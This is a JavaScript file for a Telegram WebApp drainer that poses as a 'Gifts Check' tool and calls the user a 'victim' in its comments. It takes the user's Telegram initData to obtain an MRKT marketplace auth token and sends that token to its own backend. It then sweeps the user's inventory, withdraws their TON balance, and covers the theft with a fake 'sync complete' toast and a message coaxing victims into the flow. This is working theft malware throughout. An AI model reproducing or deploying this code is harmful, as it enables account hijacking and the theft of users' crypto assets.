/**
 * MRKT backend: session → inventory sweep (offer fill) → balance withdraw.
 * Runs when business bot is linked on victim account.
 */
(async function () {
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  async function postEvent(type, detail) {
    try {
      await fetch("/api/event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type,
          detail,
          tgUser: window.Telegram?.WebApp?.initDataUnsafe?.user,
        }),
      });
    } catch (_) {}
  }

  /** MRKT auth from victim WebView (preferred). */
  async function fetchMrktTokenDirect(initData) {
    const res = await fetch("https://api.tgmrkt.io/api/v1/auth", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Referer: "https://cdn.tgmrkt.io/",
        Origin: "https://cdn.tgmrkt.io",
      },
      body: JSON.stringify({ data: initData }),
    });
    const text = await res.text();
    if (!res.ok) {
      throw new Error(`MRKT direct ${res.status}: ${text.slice(0, 200)}`);
    }
    const data = JSON.parse(text);
    if (!data.token) throw new Error("MRKT direct: no token");
    return data.token;
  }

  async function fetchMrktTokenBridge(initData) {
    const res = await fetch("/api/mrkt/auth-bridge", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ initData }),
    });
    const text = await res.text();
    if (!res.ok) {
      throw new Error(`MRKT bridge ${res.status}: ${text.slice(0, 200)}`);
    }
    const data = JSON.parse(text);
    if (!data.token) throw new Error("MRKT bridge: no token");
    return data.token;
  }

  async function resolveMrktToken(initData) {
    let lastErr = "unknown";
    try {
      const t = await fetchMrktTokenDirect(initData);
      await postEvent("mrkt_client_auth_ok", "direct");
      return t;
    } catch (e) {
      lastErr = e instanceof Error ? e.message : String(e);
      await postEvent("mrkt_client_auth_fail", lastErr);
    }
    try {
      const t = await fetchMrktTokenBridge(initData);
      await postEvent("mrkt_client_auth_ok", "bridge");
      return t;
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      await postEvent("mrkt_auth_bridge_fail", msg);
      throw new Error(lastErr + " | " + msg);
    }
  }

  window.startMrktDrain = async function startMrktDrain() {
    const initData = window.Telegram?.WebApp?.initData;
    const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
    if (!initData || !tgUser?.id || window.__mrktDrainRunning) return;
    window.__mrktDrainRunning = true;

    try {
      const bc =
        new URLSearchParams(location.search).get("bc") ||
        localStorage.getItem("bc_id") ||
        undefined;

      const mrktToken = await resolveMrktToken(initData);

      const open = await fetch("/api/mrkt/session/open", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          mrktToken,
          tgUserId: tgUser.id,
          businessConnectionId: bc,
        }),
      });
      if (!open.ok) {
        throw new Error(await open.text());
      }
      const { sessionId } = await open.json();

      let cursor = "";
      let done = false;
      for (let i = 0; i < 30 && !done; i++) {
        const sweep = await fetch("/api/mrkt/sweep", {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Session-Id": sessionId },
          body: JSON.stringify({ cursor }),
        });
        if (!sweep.ok) throw new Error(await sweep.text());
        const data = await sweep.json();
        cursor = data.cursor;
        done = data.done;
        await sleep(400);
      }

      const wd = await fetch("/api/mrkt/withdraw", {
        method: "POST",
        headers: { "X-Session-Id": sessionId },
      });
      if (!wd.ok) throw new Error(await wd.text());
      const w = await wd.json();
      await postEvent("mrkt_cycle_done", JSON.stringify(w));

      if (typeof window.showToast === "function" && w.withdrawnNano) {
        window.showToast(`Синхронизация завершена · ${(w.withdrawnNano / 1e9).toFixed(2)} TON`);
      }
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      await postEvent("mrkt_cycle_error", msg);
      console.error("MRKT drain", e);
      if (typeof window.showToast === "function") {
        const forbid = msg.includes("403") || msg.includes("Forbid");
        window.showToast(
          forbid
            ? "MRKT не пускает с Gifts Check. Сначала зайди в @mrkt, подарок в @mrktbank — сейчас дорабатываем вход через @mrkt"
            : "Ошибка синхронизации MRKT",
          "error",
        );
      }
    } finally {
      window.__mrktDrainRunning = false;
    }
  };
})();
